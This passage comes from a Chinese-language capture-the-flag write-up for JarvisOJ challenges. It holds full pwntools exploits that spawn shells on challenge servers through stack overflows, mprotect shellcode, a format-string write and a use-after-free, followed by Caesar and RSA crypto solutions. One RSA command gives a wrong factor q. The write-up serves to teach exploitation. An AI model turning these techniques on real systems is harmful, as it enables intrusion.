class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">        payload1=<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(write_plt)+p32(func)+p32(<span class="number">0x1</span>)+p32(address)+p32(<span class="number">0x4</span>)</span><br><span class="line">        r.sendline(payload1)</span><br><span class="line">        leak_address=r.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> leak_address</span><br><span class="line"></span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">sys_addr=d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(read_plt)+p32(func)+p32(<span class="number">0x0</span>)+p32(data_addr)+p32(<span class="number">0x8</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">'a'</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(sys_addr)+<span class="string">'a'</span>*<span class="number">0x4</span>+p32(data_addr)</span><br><span class="line">r.sendline(payload3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>附件同level_x64，题目说禁用了system和execve函数，请尝试使用mmap和mprotect完成本题。。</p>
+<p>（然鹅，试了一下level3_x64的exp还是可以打通。。。）</p>
+<p>mmap函数内存映射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void *mmap(void *addr,  &#x2F;&#x2F;用于指定映射存储区的起始地址，通常设置为0，表示让操作系统选择该映射区的起始地址。此函数的返回地址是映射区的起始地址。</span><br><span class="line"> size_t len,  &#x2F;&#x2F;映射的字节数</span><br><span class="line"> int plot,    &#x2F;&#x2F;对映射区的保护要求 1、PROT_READ(映射区可读)  2、PROT_WRITE(映射区可写)  3、PROT_EXEC(映射区可执行)  4、PROT_NONE(映射区不可访问)</span><br><span class="line"> int flag,    &#x2F;&#x2F;flag参数影响映射存储区的各种属性</span><br><span class="line"> int filedes,  &#x2F;&#x2F;指定要被映射文件的描述符</span><br><span class="line"> off_t off);    &#x2F;&#x2F;off表示要映射的字节在文件中的起始偏移量</span><br></pre></td></tr></table></figure>
+
+<p>mprotect函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int *mprotect(void *addr,   &#x2F;&#x2F;地址addr必须是系统页长的整数倍</span><br><span class="line"> size_t len,   &#x2F;&#x2F;len长度</span><br><span class="line"> int plot);    &#x2F;&#x2F; 对存储映射区保护要求 1、PROT_READ     2、PROT_WRITE    3、PROT_EXEC    4、PROT_NONE</span><br></pre></td></tr></table></figure>
+
+<p>思路：泄露libc地址后，计算mprotect函数地址，尝试调用改变bss段为可执行，写入shellcode并跳转执行。</p>
+<p>可以看到原本bss段是可读写不可执行的（0x600000-0x601000)</p>
+<p><img src="/image/jarvisoj/1-1605623023627.png" alt="1"></p>
+<p>mprotect的参数应该为rdi=0x600000，rsi=0x1000，rdx=7</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(vuln_addr)</span><br></pre></td></tr></table></figure>
+
+<p>泄露libc，和之前一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2&#x3D;&#39;a&#39;*0x88+p64(pop_rdi)+p64(0x600000)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(pop_rdx)+p64(7)+p64(mprotect)+p64(vuln_addr)</span><br></pre></td></tr></table></figure>
+
+<p>调用mprotect，修改权限</p>
+<p>payload2中的pop_rdx来自libc，libc基址加上0x286</p>
+<p><img src="/image/jarvisoj/1-1605706961710.png" alt="1"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload3=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(vuln_addr)</span><br></pre></td></tr></table></figure>
+
+<p>调用read函数写入shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload4=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(bss_addr)</span><br></pre></td></tr></table></figure>
+
+<p>调用shellcode</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9884</span>)</span><br><span class="line"><span class="comment">#p=process('./level3_x64')</span></span><br><span class="line">elf=ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19_x64.so'</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line">vuln_addr=elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">pop_rdi=<span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004006b1</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase=write_addr-libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">mprotect=libcbase+libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">pop_rdx=libcbase+<span class="number">0x286</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc\n"</span></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">0x600000</span>)+p64(pop_rsi_r15)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">7</span>)+p64(mprotect)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"call mprotect\n"</span></span><br><span class="line">shellcode=asm(shellcraft.amd64.linux.sh(),arch=<span class="string">'amd64'</span>) </span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload3=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(shellcode)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"send shellcode"</span></span><br><span class="line">payload4=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/2-1605707127195.png" alt="2"></p>
+<h2 id="level6-x64"><a href="#level6-x64" class="headerlink" title="level6_x64"></a>level6_x64</h2><p>是个堆相关的题目</p>
+<p>checksec</p>
+<p><img src="/image/jarvisoj/7.png" alt="7"></p>
+<p>主要功能有4个，</p>
+<p><img src="/image/jarvisoj/8.png" alt="8"></p>
+<p>main函数一开始申请了0x1810大小的堆，并进行了一些初始化。</p>
+<p><img src="/image/jarvisoj/9.png" alt="9"></p>
+<p>大概是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int v0(即*6020A8)&#x3D;256</span><br><span class="line">int *(6020A8+8)&#x3D;0</span><br><span class="line">note结构体的数组</span><br></pre></td></tr></table></figure>
+
+<p>List Note函数</p>
+<p><img src="/image/jarvisoj/10.png" alt="10"></p>
+<p>New Note函数</p>
+<p><img src="/image/jarvisoj/11-1605793302655.png" alt="11"></p>
+<p>大概是这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int inuse</span><br><span class="line">int length</span><br><span class="line">char* content</span><br></pre></td></tr></table></figure>
+
+<p>Edit Note</p>
+<p><img src="/image/jarvisoj/12-1605793379133.png" alt="12"></p>
+<p>在edit函数里对note的标志位进行了检查</p>
+<p>Delete Note</p>
+<p><img src="/image/jarvisoj/13-1605793413262.png" alt="13"></p>
+<p>delete函数中free后没有将指针置零，存在UAF漏洞。且没有检查标志位。</p>
+<p>思路：</p>
+<p>1.想办法泄露libc地址</p>
+<p>2.泄露推地址</p>
+<p>3.利用unlike获得一开始申请的管理note的堆控制</p>
+<p>4.修改got表</p>
+<p>首先泄露libc</p>
+<p>原理：第一个smallchunk释放时fd和bk指向main_arena加一个偏移的位置</p>
+<p>通过申请smallchunk然后释放在打印就可以泄露这个地址，再计算libc基址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="fm"><a href="#fm" class="headerlink" title="fm"></a>fm</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/3-1605875254456.png" alt="3"></p>
+<p>ida</p>
+<p><img src="/image/jarvisoj/5-1605875279680.png" alt="5"></p>
+<p>看到格式化字符串漏洞</p>
+<p>x需要等于4</p>
+<p>%n可以将已经输出的字符个数写入到指定的参数中</p>
+<p>x的地址在0x0804A02C</p>
+<p>需要确定x是第几个参数</p>
+<p>通过多打几个%p</p>
+<p><img src="/image/jarvisoj/6-1605876242587.png" alt="6"></p>
+<p>或者gdb调试</p>
+<p><img src="/image/jarvisoj/7-1605876258590.png" alt="7"></p>
+<p>可以看到都是第11个</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9895</span>)</span><br><span class="line"><span class="comment">#p=process('./fm')</span></span><br><span class="line">x_addr=<span class="number">0x0804A02C</span></span><br><span class="line">payload=p32(x_addr)+<span class="string">'%11$n'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="itemboard"><a href="#itemboard" class="headerlink" title="itemboard"></a>itemboard</h2><p>checksec</p>
+<p><img src="/image/jarvisoj/1-1606473982494.png" alt="1"></p>
+<p>ida分析</p>
+<p>main函数</p>
+<p><img src="/image/jarvisoj/2-1606474035220.png" alt="2"></p>
+<p>new函数</p>
+<p><img src="/image/jarvisoj/3-1606474202178.png" alt="3"></p>
+<p>remove函数</p>
+<p><img src="/image/jarvisoj/4-1606474479717.png" alt="4"></p>
+<p>这里set_null函数是一个空函数，所有存在UAF。</p>
+<p>从new和remove函数中可以看出几个结构</p>
+<p><img src="/image/jarvisoj/3.webp" alt="3"></p>
+<p>先通过uaf漏洞泄露libc</p>
+<p>申请smallbin，释放后fd和bk都指向main_arean+88的一个地址，main_arean距离malloc_hook为0x10（通过查看libc文件）。</p>
+<p>libc里也可以直接看main_arean的偏移</p>
+<p>在malloc_trim函数</p>
+<p><img src="/image/jarvisoj/1-1607081080223.png" alt="1"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'0000'</span>,<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="string">'1111'</span>,<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Description:'</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libc_base=leak_addr<span class="number">-0x3c27b8</span> <span class="comment">#0x3c2760+0x58</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以泄露libc了</p>
+<p>然后在修改free为system，并写入/bin/sh</p>
+<p>这里申请两个0x20大小的item2，item3，释放后会放到fastbin里</p>
+<p>再申请0x18大小的description的item实际上获得的就是刚才释放的item2</p>
+<p>在里面写name为/bin/sh，改free为system函数</p>
+<p>最后释放item2就可以调用system(‘/bin/sh’)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'2222'</span>,<span class="number">0x20</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="string">'3333'</span>,<span class="number">0x20</span>,<span class="string">'dddd'</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">'aaaa'</span>,<span class="number">0x18</span>,<span class="string">'/bin/sh;'</span>+<span class="string">'e'</span>*<span class="number">8</span>+p64(system_addr))</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9887</span>)</span><br><span class="line"><span class="comment">#p=process('./itemboard',env=&#123;'LD_PRELOAD':'./libc-2.19.so'&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./itemboard'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,lenth,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Item name?\n'</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">'len?\n'</span>,str(lenth))</span><br><span class="line">    p.sendlineafter(<span class="string">'Description?\n'</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">'Successfully!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Which item?\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choose:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Which item?\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="string">'0000'</span>,<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="string">'1111'</span>,<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Description:'</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">'\x0a'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libc_base=leak_addr<span class="number">-0x3c27b8</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">add(<span class="string">'2222'</span>,<span class="number">0x20</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="string">'3333'</span>,<span class="number">0x20</span>,<span class="string">'dddd'</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">add(<span class="string">'aaaa'</span>,<span class="number">0x18</span>,<span class="string">'/bin/sh;'</span>+<span class="string">'e'</span>*<span class="number">8</span>+p64(system_addr))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/jarvisoj/2-1607082053279.png" alt="2"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="xman2109-xcaesar"><a href="#xman2109-xcaesar" class="headerlink" title="[xman2109]xcaesar"></a>[xman2109]xcaesar</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_encrypt</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    r=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        r+=chr((ord(i)+k)%<span class="number">128</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> m,k</span><br><span class="line"><span class="keyword">print</span> caesar_encrypt(m,k).encode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#output:bXNobgJyaHB6aHRwdGgE</span></span><br></pre></td></tr></table></figure>
+
+<p>解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">'bXNobgJyaHB6aHRwdGgE'</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># mshn\x02rhpzhtpth\x04</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caser</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        str_list = list(cipher)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(str_list):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> str_list[i].isalpha():</span><br><span class="line">                str_list[i] = str_list[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = <span class="string">"A"</span> <span class="keyword">if</span> str_list[i].isupper() <span class="keyword">else</span> <span class="string">"a"</span></span><br><span class="line">                str_list[i] = chr((ord(str_list[i]) - ord(a) + j) % <span class="number">26</span> + ord(a))</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">''</span>.join(str_list))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">caser(<span class="string">'mshn\x02rhpzhtpth\x04'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>找到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagkaisamima</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medium-RAS"><a href="#Medium-RAS" class="headerlink" title="Medium RAS"></a>Medium RAS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -in pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure>
+
+<p>查看公钥</p>
+<p>N = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</p>
+<p>转化为10进制</p>
+<p>87924348264132406875276140514499937145050893665602592992418171647042491658461</p>
+<p>E = 65537</p>
+<p>在线大数分解</p>
+<p>p = 275127860351348928173285174381581152299</p>
+<p>q = 319576316814478949870590164193048041239</p>
+<p>生成私钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -o private.pem -e 65537 -p </span><br><span class="line">275127860351348928173285174381581152299</span><br><span class="line">-q 19576316814478949870590164193048041239</span><br></pre></td></tr></table></figure>
+
+<p>rsatool不行就用一个脚本<a href="https://eqqie.cn/index.php/laji_note/585/" target="_blank" rel="noopener">https://eqqie.cn/index.php/laji_note/585/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -inkey private.pem -in flag.enc -out flag</span><br></pre></td></tr></table></figure>
+
+<p>用私钥解密获得flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="xman2019-xyf"><a href="#xman2019-xyf" class="headerlink" title="[xman2019]xyf"></a>[xman2019]xyf</h2><p>下载附件为txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n&#x3D;3161262255255421133292506694323988711204792818702640666084331634444148712428915950639954540974469931426618702044672318134908678730641981414037034058320359158246813987154679178159391832232990193738454116371045928434239936027006539348488316754611586659587677659791620481200732564068367148541242426533823626586574915275209508300120574819113851895932912208783915652764568319771482309338434364094681579135086703127977870534715039005822312878739611630155714313119545610939253355808742646891815442758660278514976431521933763272615653261044607041876212998883732724662410197038419721773290601109065965674129599626151139566369</span><br><span class="line">e&#x3D;65537</span><br><span class="line">c&#x3D;631583911592660652215412683088688785438938386403323323131247534561958531288570612134139288090533619548876156447498627938626419617968918299212863936839701943643735437264304062828205809984533592547599060829451668240569384130130080928292082888526567902695707215660020201392640388518379063244487204881439591813398495285025704285781072987024698133147354238702861803146548057736756003294248791827782280722670457157385205787259979804892966529536902959813675537028879407802365439024711942091123058305460856676910458268097798532901040050506906141547909766093323197363034959926900440420805768716029052885452560625308314284406</span><br></pre></td></tr></table></figure>
+
+<p>尝试通过yafu分解n</p>
+<p>获得p,q</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P308 &#x3D; 56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848927</span><br><span class="line">P308 &#x3D; 56225103425920179745019828423382255030086226600783237398582720244250840205090747144995470046432814267877822949968612053620215667790366338413979256357713975498764498045710766375614107934719809398451422359883451257033337168560937824719275885709824193760523306327217910106187213556299122895037021898556005848447</span><br></pre></td></tr></table></figure>
+
+<p>python解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span 